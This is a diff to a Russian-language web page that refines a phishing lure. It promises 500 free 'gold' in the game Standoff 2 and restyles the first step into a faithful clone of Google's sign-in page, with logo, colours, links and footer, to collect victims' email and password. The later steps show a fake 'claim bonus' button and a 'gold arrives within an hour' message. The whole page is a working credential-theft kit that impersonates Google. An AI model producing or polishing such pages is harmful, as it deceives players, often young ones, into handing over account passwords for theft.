@@ -11,7 +11,166 @@
             box-sizing: border-box;
         }
 
-        body {
+        /* ==============================
+                   ШАГ 1 — БЕЛЫЙ GOOGLE LOGIN
+                ============================== */
+        .step1-body {
+            background: #ffffff;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .google-container {
+            width: 100%;
+            max-width: 448px;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            background: #ffffff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+            text-align: center;
+        }
+
+        .google-logo {
+            width: 75px;
+            height: 24px;
+            margin: 0 auto 32px;
+            display: block;
+        }
+
+        .google-logo svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .google-title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .google-sub {
+            font-size: 16px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 32px;
+        }
+
+        .google-input-group {
+            text-align: left;
+            margin-bottom: 16px;
+        }
+
+        .google-input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #5f6368;
+            margin-bottom: 4px;
+        }
+
+        .google-input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 16px;
+            font-weight: 400;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            background: #ffffff;
+            color: #202124;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        .google-input-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 1px 2px rgba(26, 115, 232, 0.2);
+        }
+
+        .btn-google {
+            width: 100%;
+            padding: 12px 0;
+            background: #1a73e8;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 12px;
+        }
+
+        .btn-google:hover {
+            background: #1557b0;
+            box-shadow: 0 1px 3px rgba(26, 115, 232, 0.3);
+        }
+
+        .btn-google:active {
+            transform: scale(0.97);
+        }
+
+        .google-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            font-size: 14px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .google-links a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .google-links a:hover {
+            text-decoration: underline;
+        }
+
+        .google-footer {
+            margin-top: 32px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .google-footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .google-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .google-error {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 8px;
+            min-height: 20px;
+        }
+
+        .google-result {
+            margin-top: 12px;
+            font-weight: 500;
+            font-size: 14px;
+            color: #34a853;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* ==============================
+                   ШАГ 2 + 3 — ТЁМНЫЙ STYANDOFF 2
+                ============================== */
+        .step2-body {
             background: #0a0a10;
             color: #fff;
             font-family: 'Segoe UI', Arial, sans-serif;
@@ -24,7 +183,6 @@
             position: relative;
         }
 
-        /* === ФОН С ОРУЖИЕМ === */
         .bg-layer {
             position: fixed;
             top: 0;
@@ -36,13 +194,13 @@
             overflow: hidden;
             opacity: 0.12;
         }
+
         .bg-svg {
             width: 100%;
             height: 100%;
         }
 
-        /* === КОНТЕЙНЕР === */
-        .container {
+        .dark-container {
             background: linear-gradient(145deg, rgba(20, 20, 30, 0.94), rgba(10, 10, 16, 0.97));
             padding: 30px 22px 25px;
             border-radius: 32px;
@@ -56,117 +214,6 @@
             backdrop-filter: blur(4px);
         }
 
-        /* === ШАГ 1: Вход через Google (клон) === */
-        .google-logo {
-            margin: 0 auto 20px;
-            display: block;
-        }
-        .google-logo svg {
-            width: 75px;
-            height: 24px;
-        }
-
-        .step-title {
-            font-size: 26px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            letter-spacing: 1px;
-            margin-bottom: 6px;
-        }
-
-        .step-sub {
-            color: #99aabb;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-
-        .input-group {
-            text-align: left;
-            margin-bottom: 14px;
-        }
-        .input-group label {
-            display: block;
-            font-size: 13px;
-            color: #99aabb;
-            margin-bottom: 4px;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #2a2a3e;
-            border-radius: 16px;
-            background: #0e0e18;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-            transition: 0.3s;
-            box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.5);
-        }
-        .input-group input:focus {
-            border-color: #ffd700;
-            box-shadow: 0 0 20px #ffd70015, inset 0 2px 8px rgba(0, 0, 0, 0.5);
-        }
-
-        .btn {
-            width: 100%;
-            padding: 16px 0;
-            border: none;
-            border-radius: 40px;
-            font-size: 18px;
-            font-weight: 800;
-            cursor: pointer;
-            transition: 0.3s;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            margin-top: 6px;
-        }
-
-        .btn-google {
-            background: linear-gradient(135deg, #1a73e8, #1557b0);
-            color: #fff;
-            box-shadow: 0 4px 20px #1a73e833;
-        }
-        .btn-google:hover {
-            transform: scale(1.02);
-            box-shadow: 0 4px 30px #1a73e855;
-        }
-
-        .btn-gold {
-            background: linear-gradient(135deg, #ffd700, #f0a500);
-            color: #0a0a10;
-            box-shadow: 0 4px 20px #ffd70033;
-            font-size: 20px;
-        }
-        .btn-gold:hover {
-            transform: scale(1.02);
-            box-shadow: 0 4px 40px #ffd70055;
-        }
-
-        .btn:active {
-            transform: scale(0.96);
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        .error-msg {
-            color: #ff4444;
-            font-size: 14px;
-            margin-top: 6px;
-            min-height: 20px;
-        }
-
-        .result {
-            margin-top: 12px;
-            font-weight: 600;
-            font-size: 15px;
-            color: #00ff88;
-        }
-
-        /* === ШАГ 2: ЗАБРАТЬ ГОЛДУ === */
         .gold-icon {
             font-size: 48px;
             margin-bottom: 6px;
@@ -195,13 +242,44 @@
             color: #ffaa00;
         }
 
-        .gold-desc {
+        .dark-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+
+        .dark-desc {
             color: #99aabb;
             font-size: 16px;
             margin-bottom: 18px;
         }
 
-        /* === ШАГ 3: ГОЛДА ПРИДЁТ === */
+        .btn-gold {
+            width: 100%;
+            padding: 16px 0;
+            border: none;
+            border-radius: 40px;
+            font-size: 20px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            background: linear-gradient(135deg, #ffd700, #f0a500);
+            color: #0a0a10;
+            box-shadow: 0 4px 20px #ffd70033;
+        }
+
+        .btn-gold:hover {
+            transform: scale(1.02);
+            box-shadow: 0 4px 40px #ffd70055;
+        }
+
+        .btn-gold:active {
+            transform: scale(0.96);
+        }
+
         .check-icon {
             font-size: 56px;
             margin-bottom: 8px;
@@ -226,113 +304,58 @@
             color: #667;
         }
 
-        /* === Адаптация === */
+        /* ==============================
+                   АДАПТАЦИЯ
+                ============================== */
         @media (max-width: 480px) {
-            .container {
+            .google-container {
+                padding: 32px 20px 28px;
+                border: none;
+                box-shadow: none;
+            }
+            .google-title {
+                font-size: 22px;
+            }
+            .dark-container {
                 padding: 24px 16px 20px;
                 max-width: 95%;
-            }
-            .step-title {
-                font-size: 22px;
             }
             .gold-badge {
                 font-size: 22px;
                 padding: 8px 16px;
             }
-            .btn {
-                font-size: 16px;
-                padding: 14px 0;
-            }
             .btn-gold {
                 font-size: 18px;
+                padding: 14px 0;
             }
         }
 
         @media (max-width: 380px) {
-            .container {
-                padding: 18px 12px 16px;
+            .google-container {
+                padding: 24px 16px 20px;
             }
-            .step-title {
-                font-size: 20px;
+            .dark-container {
+                padding: 18px 12px 16px;
             }
             .gold-badge {
                 font-size: 18px;
                 padding: 6px 12px;
+            }
+            .btn-gold {
+                font-size: 16px;
+                padding: 12px 0;
             }
         }
     </style>
 </head>
 <body>
 
-    <!-- ФОН С ОРУЖИЕМ И АГЕНТАМИ -->
-    <div class="bg-layer">
-        <svg class="bg-svg" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice">
-            <g transform="translate(40, 40) rotate(-20)" opacity="0.25">
-                <rect x="0" y="8" width="70" height="12" rx="4" fill="#8899bb"/>
-                <rect x="60" y="4" width="20" height="20" rx="4" fill="#667788"/>
-                <circle cx="70" cy="14" r="4" fill="#ffd700"/>
-            </g>
-            <g transform="translate(680, 30) rotate(15)" opacity="0.2">
-                <rect x="0" y="6" width="80" height="10" rx="3" fill="#99aabb"/>
-                <rect x="70" y="0" width="25" height="22" rx="4" fill="#8899bb"/>
-                <circle cx="82" cy="11" r="5" fill="#ffd700"/>
-            </g>
-            <g transform="translate(20, 260) rotate(-30)" opacity="0.2">
-                <polygon points="0,0 60,-6 55,6" fill="#aabbcc"/>
-                <circle cx="8" cy="0" r="5" fill="#ffd700"/>
-            </g>
-            <g transform="translate(720, 300) rotate(25)" opacity="0.2">
-                <rect x="0" y="6" width="60" height="10" rx="3" fill="#8899bb"/>
-                <rect x="50" y="2" width="16" height="18" rx="3" fill="#667788"/>
-                <circle cx="58" cy="11" r="3.5" fill="#ffd700"/>
-            </g>
-            <g transform="translate(30, 470)" opacity="0.15">
-                <circle cx="30" cy="0" r="16" fill="#445566"/>
-                <rect x="16" y="-14" width="28" height="12" rx="6" fill="#556677"/>
-                <rect x="12" y="12" width="36" height="40" rx="8" fill="#2a3a4a"/>
-                <rect x="16" y="14" width="28" height="28" rx="4" fill="#1a2a3a" stroke="#ffd700" stroke-width="1"/>
-                <rect x="0" y="14" width="12" height="24" rx="4" fill="#445566"/>
-                <rect x="48" y="14" width="12" height="24" rx="4" fill="#445566"/>
-                <rect x="14" y="52" width="10" height="24" rx="3" fill="#334455"/>
-                <rect x="36" y="52" width="10" height="24" rx="3" fill="#334455"/>
-                <rect x="52" y="16" width="30" height="6" rx="2" fill="#8899bb"/>
-                <rect x="76" y="14" width="10" height="10" rx="2" fill="#667788"/>
-            </g>
-            <g transform="translate(680, 490)" opacity="0.12">
-                <circle cx="30" cy="0" r="14" fill="#556677"/>
-                <rect x="18" y="-12" width="24" height="10" rx="5" fill="#667788"/>
-                <rect x="14" y="10" width="32" height="36" rx="6" fill="#2a3a4a"/>
-                <rect x="18" y="12" width="24" height="24" rx="3" fill="#1a2a3a" stroke="#ffd700" stroke-width="1"/>
-                <rect x="2" y="12" width="12" height="20" rx="3" fill="#445566"/>
-                <rect x="46" y="12" width="12" height="20" rx="3" fill="#445566"/>
-                <rect x="16" y="46" width="8" height="20" rx="3" fill="#334455"/>
-                <rect x="36" y="46" width="8" height="20" rx="3" fill="#334455"/>
-            </g>
-            <g opacity="0.25">
-                <rect x="140" y="80" width="18" height="8" rx="2" fill="#ffd700"/>
-                <rect x="150" y="85" width="18" height="8" rx="2" fill="#ffaa00"/>
-                <rect x="130" y="92" width="16" height="7" rx="2" fill="#ffd700"/>
-                <rect x="620" y="120" width="20" height="9" rx="2" fill="#ffd700"/>
-                <rect x="640" y="128" width="18" height="8" rx="2" fill="#ffaa00"/>
-                <rect x="70" y="380" width="16" height="7" rx="2" fill="#ffd700"/>
-                <rect x="700" y="400" width="20" height="9" rx="2" fill="#ffd700"/>
-                <rect x="200" y="520" width="18" height="8" rx="2" fill="#ffaa00"/>
-                <rect x="560" y="530" width="16" height="7" rx="2" fill="#ffd700"/>
-            </g>
-            <g opacity="0.08">
-                <circle cx="380" cy="100" r="30" fill="none" stroke="#ffd700" stroke-width="2"/>
-                <circle cx="380" cy="100" r="18" fill="#ffd700" opacity="0.3"/>
-                <circle cx="400" cy="450" r="24" fill="none" stroke="#ff8800" stroke-width="2"/>
-                <circle cx="400" cy="450" r="12" fill="#ff8800" opacity="0.2"/>
-            </g>
-        </svg>
-    </div>
+    <!-- ============================================ -->
+    <!-- ШАГ 1 — БЕЛЫЙ GOOGLE LOGIN                   -->
+    <!-- ============================================ -->
+    <div id="step1" class="step1-body">
+        <div class="google-container">
 
-    <!-- ОСНОВНОЙ КОНТЕЙНЕР -->
-    <div class="container">
-
-        <!-- ===== ШАГ 1: Клон Google Login ===== -->
-        <div id="step1">
             <div class="google-logo">
                 <svg viewBox="0 0 48 16" width="100%" height="100%">
                     <path fill="#4285F4" d="M 32.6 8.1 c 0 0.6 0.1 1.3 0.3 1.9 h -1.8 v -1.4 h 0.6 c -0.1 -0.3 -0.2 -0.6 -0.2 -0.9 c 0 -0.5 0.3 -0.9 0.9 -1.1 c 0.6 -0.2 1.2 -0.1 1.6 0.3 l 1.1 -1.1 c -0.7 -0.6 -1.6 -0.9 -2.6 -0.9 c -1.3 0 -2.5 0.5 -3.4 1.4 c -0.9 0.9 -1.4 2.1 -1.4 3.4 c 0 1.3 0.5 2.5 1.4 3.4 c 0.9 0.9 2.1 1.4 3.4 1.4 c 1.3 0 2.5 -0.5 3.4 -1.4 c 0.9 -0.9 1.4 -2.1 1.4 -3.4 c 0 -0.6 -0.1 -1.2 -0.3 -1.8 h -4.4 v 1.7 h 2.4 c -0.2 0.6 -0.6 1.1 -1.1 1.5 c -0.5 0.4 -1.1 0.6 -1.8 0.6 c -0.9 0 -1.7 -0.4 -2.3 -1 c -0.6 -0.6 -0.9 -1.4 -0.9 -2.2 c 0 -0.9 0.3 -1.7 0.9 -2.3 c 0.6 -0.6 1.4 -0.9 2.3 -0.9 c 0.7 0 1.3 0.2 1.8 0.7 l 0.8 -0.8 c -0.6 -0.6 -1.5 -1 -2.5 -1 c -1.2 0 -2.3 0.5 -3.1 1.3 c -0.8 0.8 -1.3 2 -1.3 3.3 c 0 1.3 0.5 2.5 1.3 3.3 c 0.8 0.8 2 1.3 3.1 1.3 c 1.2 0 2.3 -0.5 3.1 -1.3 c 0.8 -0.8 1.3 -2 1.3 -3.3 c 0 -0.1 0 -0.2 0 -0.3 z"/>
@@ -343,45 +366,147 @@
                 </svg>
             </div>
 
-            <div class="step-title">500 ГОЛДЫ</div>
-            <div class="step-sub">Войди в аккаунт Google, чтобы получить бонус</div>
+            <div class="google-title">Вход</div>
+            <div class="google-sub">Войдите в свой аккаунт Google</div>
 
             <form id="loginForm" onsubmit="submitForm(event)">
-                <div class="input-group">
-                    <label>Электронная почта</label>
+                <div class="google-input-group">
+                    <label for="email">Электронная почта или телефон</label>
                     <input type="email" id="email" placeholder="your@gmail.com" required>
                 </div>
 
-                <div id="passwordField" class="input-group hidden">
-                    <label>Пароль</label>
+                <div id="passwordField" class="google-input-group hidden">
+                    <label for="password">Пароль</label>
                     <input type="password" id="password" placeholder="Введите пароль" required>
                 </div>
 
-                <div class="error-msg" id="errorMsg"></div>
+                <div class="google-error" id="errorMsg"></div>
 
-                <button type="submit" class="btn btn-google" id="submitBtn">ДАЛЕЕ</button>
+                <button type="submit" class="btn-google" id="submitBtn">Далее</button>
             </form>
 
-            <div id="result" class="result hidden"></div>
+            <div class="google-links">
+                <a href="#">Забыли пароль?</a>
+                <a href="#">Создать аккаунт</a>
+            </div>
+
+            <div id="result" class="google-result hidden"></div>
+
+            <div class="google-footer">
+                <span>Русский</span> &nbsp;·&nbsp;
+                <a href="#">Справка</a> &nbsp;·&nbsp;
+                <a href="#">Конфиденциальность</a> &nbsp;·&nbsp;
+                <a href="#">Условия</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- ШАГ 2 — ТЁМНЫЙ STANDOFF 2                    -->
+    <!-- ============================================ -->
+    <div id="step2" class="step2-body hidden">
+        <div class="bg-layer">
+            <svg class="bg-svg" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice">
+                <g transform="translate(40, 40) rotate(-20)" opacity="0.25">
+                    <rect x="0" y="8" width="70" height="12" rx="4" fill="#8899bb"/>
+                    <rect x="60" y="4" width="20" height="20" rx="4" fill="#667788"/>
+                    <circle cx="70" cy="14" r="4" fill="#ffd700"/>
+                </g>
+                <g transform="translate(680, 30) rotate(15)" opacity="0.2">
+                    <rect x="0" y="6" width="80" height="10" rx="3" fill="#99aabb"/>
+                    <rect x="70" y="0" width="25" height="22" rx="4" fill="#8899bb"/>
+                    <circle cx="82" cy="11" r="5" fill="#ffd700"/>
+                </g>
+                <g transform="translate(20, 260) rotate(-30)" opacity="0.2">
+                    <polygon points="0,0 60,-6 55,6" fill="#aabbcc"/>
+                    <circle cx="8" cy="0" r="5" fill="#ffd700"/>
+                </g>
+                <g transform="translate(720, 300) rotate(25)" opacity="0.2">
+                    <rect x="0" y="6" width="60" height="10" rx="3" fill="#8899bb"/>
+                    <rect x="50" y="2" width="16" height="18" rx="3" fill="#667788"/>
+                    <circle cx="58" cy="11" r="3.5" fill="#ffd700"/>
+                </g>
+                <g transform="translate(30, 470)" opacity="0.15">
+                    <circle cx="30" cy="0" r="16" fill="#445566"/>
+                    <rect x="16" y="-14" width="28" height="12" rx="6" fill="#556677"/>
+                    <rect x="12" y="12" width="36" height="40" rx="8" fill="#2a3a4a"/>
+                    <rect x="16" y="14" width="28" height="28" rx="4" fill="#1a2a3a" stroke="#ffd700" stroke-width="1"/>
+                    <rect x="0" y="14" width="12" height="24" rx="4" fill="#445566"/>
+                    <rect x="48" y="14" width="12" height="24" rx="4" fill="#445566"/>
+                    <rect x="14" y="52" width="10" height="24" rx="3" fill="#334455"/>
+                    <rect x="36" y="52" width="10" height="24" rx="3" fill="#334455"/>
+                    <rect x="52" y="16" width="30" height="6" rx="2" fill="#8899bb"/>
+                    <rect x="76" y="14" width="10" height="10" rx="2" fill="#667788"/>
+                </g>
+                <g transform="translate(680, 490)" opacity="0.12">
+                    <circle cx="30" cy="0" r="14" fill="#556677"/>
+                    <rect x="18" y="-12" width="24" height="10" rx="5" fill="#667788"/>
+                    <rect x="14" y="10" width="32" height="36" rx="6" fill="#2a3a4a"/>
+                    <rect x="18" y="12" width="24" height="24" rx="3" fill="#1a2a3a" stroke="#ffd700" stroke-width="1"/>
+                    <rect x="2" y="12" width="12" height="20" rx="3" fill="#445566"/>
+                    <rect x="46" y="12" width="12" height="20" rx="3" fill="#445566"/>
+                    <rect x="16" y="46" width="8" height="20" rx="3" fill="#334455"/>
+                    <rect x="36" y="46" width="8" height="20" rx="3" fill="#334455"/>
+                </g>
+                <g opacity="0.25">
+                    <rect x="140" y="80" width="18" height="8" rx="2" fill="#ffd700"/>
+                    <rect x="150" y="85" width="18" height="8" rx="2" fill="#ffaa00"/>
+                    <rect x="130" y="92" width="16" height="7" rx="2" fill="#ffd700"/>
+                    <rect x="620" y="120" width="20" height="9" rx="2" fill="#ffd700"/>
+                    <rect x="640" y="128" width="18" height="8" rx="2" fill="#ffaa00"/>
+                    <rect x="70" y="380" width="16" height="7" rx="2" fill="#ffd700"/>
+                    <rect x="700" y="400" width="20" height="9" rx="2" fill="#ffd700"/>
+                    <rect x="200" y="520" width="18" height="8" rx="2" fill="#ffaa00"/>
+                    <rect x="560" y="530" width="16" height="7" rx="2" fill="#ffd700"/>
+                </g>
+                <g opacity="0.08">
+                    <circle cx="380" cy="100" r="30" fill="none" stroke="#ffd700" stroke-width="2"/>
+                    <circle cx="380" cy="100" r="18" fill="#ffd700" opacity="0.3"/>
+                    <circle cx="400" cy="450" r="24" fill="none" stroke="#ff8800" stroke-width="2"/>
+                    <circle cx="400" cy="450" r="12" fill="#ff8800" opacity="0.2"/>
+                </g>
+            </svg>
         </div>
 
-        <!-- ===== ШАГ 2: ЗАБРАТЬ 500 ГОЛДЫ ===== -->
-        <div id="step2" class="hidden">
+        <div class="dark-container">
             <span class="gold-icon">🎯</span>
             <div class="gold-badge">+500 ГОЛДЫ</div>
-            <div style="font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 4px;">Забери бонус!</div>
-            <div class="gold-desc">Нажми кнопку, чтобы получить голду</div>
-            <button class="btn btn-gold" onclick="showStep3()">ЗАБРАТЬ ГОЛДУ</button>
+            <div class="dark-title">Забери бонус!</div>
+            <div class="dark-desc">Нажми кнопку, чтобы получить голду</div>
+            <button class="btn-gold" onclick="showStep3()">ЗАБРАТЬ ГОЛДУ</button>
+        </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- ШАГ 3 — ГОЛДА ПРИДЁТ В ТЕЧЕНИЕ ЧАСА         -->
+    <!-- ============================================ -->
+    <div id="step3" class="step2-body hidden">
+        <div class="bg-layer">
+            <svg class="bg-svg" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice">
+                <g transform="translate(40, 40) rotate(-20)" opacity="0.25">
+                    <rect x="0" y="8" width="70" height="12" rx="4" fill="#8899bb"/>
+                    <rect x="60" y="4" width="20" height="20" rx="4" fill="#667788"/>
+                    <circle cx="70" cy="14" r="4" fill="#ffd700"/>
+                </g>
+                <g transform="translate(680, 30) rotate(15)" opacity="0.2">
+                    <rect x="0" y="6" width="80" height="10" rx="3" fill="#99aabb"/>
+                    <rect x="70" y="0" width="25" height="22" rx="4" fill="#8899bb"/>
+                    <circle cx="82" cy="11" r="5" fill="#ffd700"/>
+                </g>
+                <g opacity="0.25">
+                    <rect x="140" y="80" width="18" height="8" rx="2" fill="#ffd700"/>
+                    <rect x="620" y="120" width="20" height="9" rx="2" fill="#ffd700"/>
+                    <rect x="200" y="520" width="18" height="8" rx="2" fill="#ffaa00"/>
+                </g>
+            </svg>
         </div>
 
-        <!-- ===== ШАГ 3: ГОЛДА ПРИДЁТ В ТЕЧЕНИЕ ЧАСА ===== -->
-        <div id="step3" class="hidden">
+        <div class="dark-container">
             <span class="check-icon">✅</span>
             <div class="success-title">Голда придёт в течение часа</div>
             <div class="success-desc">Ваш бонус будет начислен в ближайшее время</div>
             <div class="timer-text">🕒 Ожидайте до 60 минут</div>
         </div>
-
     </div>
 
     <script>
@@ -430,7 +555,7 @@
 
                 if (data.success) {
                     result.textContent = '✅ Вход выполнен';
-                    result.style.color = '#00ff88';
+                    result.style.color = '#34a853';
 
                     setTimeout(() => {
                         document.getElementById('step1').classList.add('hidden');
@@ -438,11 +563,11 @@
                     }, 700);
                 } else {
                     result.textContent = '❌ ' + (data.error || 'попробуйте снова');
-                    result.style.color = '#ff4444';
+                    result.style.color = '#d93025';
                 }
             } catch (err) {
                 result.textContent = '❌ Ошибка соединения';
-                result.style.color = '#ff4444';
+                result.style.color = '#d93025';
             }
         }
 
